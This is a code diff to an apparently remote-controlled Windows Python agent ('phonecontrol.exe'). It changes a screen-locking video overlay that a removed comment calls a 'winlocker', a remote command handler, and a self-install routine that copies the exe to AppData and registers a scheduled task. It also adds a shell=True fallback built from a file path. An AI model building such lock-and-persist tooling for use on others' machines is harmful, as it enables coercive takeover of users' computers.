@@ -435,23 +435,21 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
             close_btn.pack()
 
     # ── Video — открываем через встроенный плеер Windows ─────────────────────
-    # Запускаем видео в стандартном плеере (Кино и ТВ / WMP)
-    video_proc = subprocess.Popen(
-        ["cmd", "/c", "start", "", video_path],
-        shell=False
-    )
+    try:
+        os.startfile(video_path)
+    except Exception as e:
+        log.error(f"os.startfile failed: {e}")
+        subprocess.Popen(f'start "" "{video_path}"', shell=True)
 
     tk.Label(root, text="▶  Воспроизведение видео...", bg="black", fg="white",
              font=("Segoe UI", 22)).pack(expand=True)
 
     def _kill_video():
-        """Закрыть видео-плеер когда winlocker снимается."""
         try:
-            # Убиваем по имени — работает для большинства плееров
             subprocess.run(["taskkill", "/f", "/im", "Video.UI.exe"],
-                           capture_output=True)  # Кино и ТВ
+                           capture_output=True)
             subprocess.run(["taskkill", "/f", "/im", "wmplayer.exe"],
-                           capture_output=True)  # Windows Media Player
+                           capture_output=True)
         except Exception:
             pass
 
@@ -674,7 +672,10 @@ def handle_command(cmd: dict):
         ban_state.unban()
 
     elif name == "sound":
-        set_volume(cmd.get("level", 5))
+        # pycaw может блокировать — запускаем в отдельном потоке
+        threading.Thread(
+            target=set_volume, args=(cmd.get("level", 5),), daemon=True
+        ).start()
 
     elif name == "show_message":
         text = cmd.get("text", "")
@@ -804,15 +805,26 @@ def is_installed() -> bool:
 
 def self_install():
     """Copy exe to AppData, register scheduled task, launch it, exit."""
+    import shutil
+
     INSTALL_DIR.mkdir(parents=True, exist_ok=True)
 
+    # Убиваем старый процесс если он запущен из папки установки
+    if INSTALL_EXE.exists():
+        subprocess.run(
+            ["taskkill", "/f", "/im", "phonecontrol.exe"],
+            capture_output=True, timeout=10
+        )
+        time.sleep(1.5)  # ждём пока процесс завершится и отпустит файл
+
     src = Path(sys.executable)
-    # Copy assets folder too
     src_assets = src.parent / "assets"
     dst_assets = INSTALL_DIR / "assets"
 
-    import shutil
+    # Копируем exe (перезаписываем старый)
     shutil.copy2(src, INSTALL_EXE)
+
+    # Копируем assets
     if src_assets.exists():
         if dst_assets.exists():
             shutil.rmtree(dst_assets)
